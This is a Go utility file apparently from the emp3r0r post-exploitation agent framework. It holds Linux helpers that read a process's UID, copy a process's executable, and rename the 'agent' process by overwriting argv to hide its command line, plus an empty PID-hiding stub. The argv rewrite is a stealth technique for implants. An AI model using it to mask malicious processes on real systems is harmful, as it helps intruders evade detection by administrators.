//go:build linux
// +build linux

package util

import (
	"bufio"
	"fmt"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"os"
	"strings"
	"unsafe"
)

// ProcUID get euid of a process
func ProcUID(pid int) string {
	f, err := os.Open(fmt.Sprintf("/proc/%d/status", pid))
	if err != nil {
		return ""
	}
	defer f.Close()
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if strings.HasPrefix(line, "Uid:") {
			uid := strings.Fields(line)[1]
			return uid
		}
	}
	return ""
}

// CopyProcExeTo copy executable of an process to dest_path
func CopyProcExeTo(pid int, dest_path string) (err error) {
	elf_data, err := os.ReadFile(fmt.Sprintf("/proc/%d/exe", pid))
	if err != nil {
		return fmt.Errorf("read %d exe: %v", pid, err)
	}

	// overwrite
	if IsExist(dest_path) {
		RemoveFileAgent(dest_path)
	}

	return WriteFileAgent(dest_path, elf_data, 0o755)
}

// rename agent process by modifying its argv, all cmdline args are dropped
func SetProcName(name string) {
	for i := range os.Args {
		argvN := unsafe.Slice(unsafe.StringData(os.Args[i]), len(os.Args[i]))

		// pad name to match argv[0] length
		pad := len(os.Args[i]) - len(name)
		if pad > 0 {
			logging.Printf("padding %d of 0x00", pad)
			name += strings.Repeat("\x00", pad)
		}

		n := copy(argvN, name)
		if i > 0 {
			n = copy(argvN, []byte(strings.Repeat("\x00", len(os.Args[i]))))
		}
		if n < len(argvN) {
			argvN[n] = 0
		}
	}
}

// HidePIDs hide process IDs using Linux-specific methods
func HidePIDs() error {
	// This function is implemented in the persistence module for Linux
	// This is a dummy implementation to match the interface
	return nil
}
